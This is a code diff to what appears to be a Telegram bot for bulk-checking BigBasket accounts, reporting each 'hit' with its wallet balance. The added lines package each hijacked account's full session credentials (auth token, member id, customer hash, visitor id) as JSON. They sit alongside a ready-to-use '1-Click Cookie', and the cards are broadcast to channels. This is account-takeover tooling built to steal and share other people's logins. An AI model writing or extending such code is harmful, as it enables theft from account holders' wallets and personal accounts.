@@ -1719,6 +1719,12 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                     fc_lines = f"🆓 <b>Free Cash:</b> <b>₹0.00</b>\n"
 
                 cookie_disp = cookie_str if cookie_str else "N/A"
+                auth_json_disp = json.dumps({
+                    "bb_token": bb.token,
+                    "m_id": auth_data.get("m_id", ""),
+                    "customer_hash": auth_data.get("customer_hash", ""),
+                    "visitor_id": auth_data.get("visitor_id") or auth_data.get("vid", "")
+                }, indent=2)
 
                 hit_card = (
                     f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
@@ -1734,6 +1740,8 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                     f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"🍪 <b>1-Click Cookie:</b>\n<code>{esc(cookie_disp)}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"⚡ <b>BB AUTH JSON:</b>\n<pre><code class=\"language-json\">{esc(auth_json_disp)}</code></pre>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"✅ <i>Saved to report & broadcast to channels!</i>"
                 )
@@ -3108,6 +3116,12 @@ def handle_incoming_text(message):
                 fc_lines = f"🆓 <b>Free Cash:</b> <b>₹0.00</b>\n"
 
             cookie_disp = cookie_str if cookie_str else "N/A"
+            auth_json_disp = json.dumps({
+                "bb_token": bb.token,
+                "m_id": auth_d.get("m_id", ""),
+                "customer_hash": auth_d.get("customer_hash", ""),
+                "visitor_id": auth_d.get("visitor_id") or auth_d.get("vid", "")
+            }, indent=2)
 
             card = (
                 f"🎉 <b>BIGBASKET WALLET RESULT</b>\n"
@@ -3122,6 +3136,8 @@ def handle_incoming_text(message):
                 f"🔑 <b>Token:</b> <code>{esc(bb.token[:32])}...</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🍪 <b>1-Click Cookie:</b>\n<code>{esc(cookie_disp)}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⚡ <b>BB AUTH JSON:</b>\n<pre><code class=\"language-json\">{esc(auth_json_disp)}</code></pre>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ Checked at: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
             )
